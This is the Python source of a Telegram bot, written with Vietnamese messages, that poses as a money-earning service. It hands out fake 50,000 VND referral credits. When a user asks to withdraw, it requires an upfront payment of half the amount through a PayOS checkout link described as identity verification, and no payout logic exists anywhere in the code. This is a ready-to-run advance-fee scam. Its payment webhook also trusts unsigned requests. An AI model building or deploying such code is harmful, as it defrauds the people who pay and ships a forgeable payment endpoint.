import asyncio, json, hashlib, hmac, threading, requests
import aiosqlite
from fastapi import FastAPI, Request

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= CONFIG =================

TOKEN = "PUT_BOT_TOKEN"
ADMIN_ID = 123456789

PAYOS_CLIENT_ID = "PAYOS_CLIENT_ID"
PAYOS_API_KEY = "PAYOS_API_KEY"
PAYOS_CHECKSUM_KEY = "PAYOS_CHECKSUM_KEY"

bot = Bot(TOKEN)
dp = Dispatcher()
app = FastAPI()

# ================= DATABASE =================

async def init_db():
    async with aiosqlite.connect("data.db") as db:
        await db.execute("""
        CREATE TABLE IF NOT EXISTS users(
            user_id INTEGER PRIMARY KEY,
            vnd INTEGER DEFAULT 0
        )
        """)
        await db.commit()

async def add_user(uid):
    async with aiosqlite.connect("data.db") as db:
        await db.execute(
            "INSERT OR IGNORE INTO users(user_id) VALUES(?)",
            (uid,)
        )
        await db.commit()

async def get_user(uid):
    async with aiosqlite.connect("data.db") as db:
        cur = await db.execute(
            "SELECT * FROM users WHERE user_id=?",
            (uid,)
        )
        return await cur.fetchone()

async def add_money(uid, amount):
    async with aiosqlite.connect("data.db") as db:
        await db.execute(
            "UPDATE users SET vnd=vnd+? WHERE user_id=?",
            (amount, uid)
        )
        await db.commit()

async def deduct(uid, amount):
    async with aiosqlite.connect("data.db") as db:
        await db.execute(
            "UPDATE users SET vnd=vnd-? WHERE user_id=?",
            (amount, uid)
        )
        await db.commit()

# ================= PAYOS =================

def create_payos_payment(order_id, amount):
    data = {
        "orderCode": order_id,
        "amount": amount,
        "description": "Xac minh danh tinh rut tien"
    }

    raw = json.dumps(data, separators=(",", ":"))
    signature = hmac.new(
        PAYOS_CHECKSUM_KEY.encode(),
        raw.encode(),
        hashlib.sha256
    ).hexdigest()

    headers = {
        "x-client-id": PAYOS_CLIENT_ID,
        "x-api-key": PAYOS_API_KEY,
        "x-signature": signature,
        "Content-Type": "application/json"
    }

    r = requests.post(
        "https://api-merchant.payos.vn/v2/payment-requests",
        headers=headers,
        data=raw
    )

    return r.json()

@app.post("/payos")
async def payos_webhook(req: Request):
    data = await req.json()

    if data.get("status") == "PAID":
        uid = int(data["orderCode"])
        amount = int(data["amount"])
        await add_money(uid, amount)
        await bot.send_message(uid, f"✅ Nạp thành công {amount:,}đ")

    return {"ok": True}

# ================= MENU =================

def menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Mời bạn (+50k)", callback_data="ref")],
        [InlineKeyboardButton(text="💰 Số dư", callback_data="bal")],
        [InlineKeyboardButton(text="💸 Rút tiền", callback_data="wd")]
    ])

# ================= START =================

@dp.message(Command("start"))
async def start(m):
    await add_user(m.from_user.id)

    if len(m.text.split()) > 1:
        ref = int(m.text.split()[1])
        if ref != m.from_user.id:
            await add_user(ref)
            await add_money(ref, 50000)

    await m.answer("🤖 BOT KIẾM TIỀN", reply_markup=menu())

# ================= CALLBACK =================

@dp.callback_query()
async def call(c):
    uid = c.from_user.id
    u = await get_user(uid)

    if c.data == "ref":
        link = f"https://t.me/YOURBOT?start={uid}"
        await c.message.edit_text(
            f"👥 Link mời bạn:\n{link}\n+50.000đ / người"
        )

    if c.data == "bal":
        await c.message.edit_text(
            f"💰 Số dư: {u[1]:,} VNĐ"
        )

    if c.data == "wd":
        await c.message.edit_text(
            "💸 Nhập số tiền muốn rút\n"
            "Hệ thống sẽ yêu cầu bạn nạp trước 50% số tiền đó"
        )
        dp.message.register(handle_withdraw)

# ================= RÚT =================

async def handle_withdraw(m):
    if not m.text.isdigit():
        return

    amount = int(m.text)
    half = amount // 2

    pay = create_payos_payment(
        order_id=m.from_user.id,
        amount=half
    )

    link = pay["data"]["checkoutUrl"]

    await m.answer(
        f"🔐 Để rút {amount:,}đ\n"
        f"Bạn cần nạp trước {half:,}đ\n\n"
        f"{link}\n\n"
        "Sau khi nạp xong, quay lại bấm Rút tiền"
    )

# ================= RUN =================

def run_api():
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)

async def main():
    await init_db()
    threading.Thread(target=run_api).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
